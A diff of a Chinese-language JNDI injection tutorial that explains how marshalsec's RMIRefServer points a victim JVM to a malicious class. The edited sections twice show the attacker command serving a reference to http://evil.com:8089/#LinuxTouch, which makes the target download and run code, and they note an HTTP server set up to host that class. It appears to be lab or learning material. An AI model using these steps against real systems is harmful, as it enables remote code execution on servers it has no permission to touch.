@@ -64,11 +64,10 @@ DataSource ds = (DataSource) ctx.lookup(getDataSourceName());  // JNDI 查询
 marshalsec 不负责执行恶意逻辑，它只负责 “当有人对我做 JNDI/rmi `lookup` 时，我返回一种会指向远程 HTTP 上某个类的引用；真正执行恶意代码的是受害 JVM 加载并初始化那个类时触发的 Java 语义“TouchFile”，也就是说marshalsec只负责转发。
 
 ```
+# 攻击机执行
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \
   "http://evil.com:8089/#LinuxTouch" 9473
 ```
-
-> 攻击机执行
 
 **这个RMI服务的作用**：
 
@@ -112,18 +111,15 @@ marshalsec 就是专门 伪造 LDAP 返回的工具。
 
 ### 开启本地的 python -m http.server 8001
 
-> 攻击机执行
-
-开启这个端口后，构建的
+开启这个端口后，构建的恶意类才能被靶机下载。
 
 ```
+# 攻击机执行
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \
   "http://evil.com:8089/#LinuxTouch" 9473
 ```
 
-> 攻击机执行
-
-才能被传出去，也就是创建端口->构造jndi
+也就是创建端口 → 构造 JNDI 引用 → 靶机下载类 → 执行。
 
 ### 发送恶意Payload（发包）
 
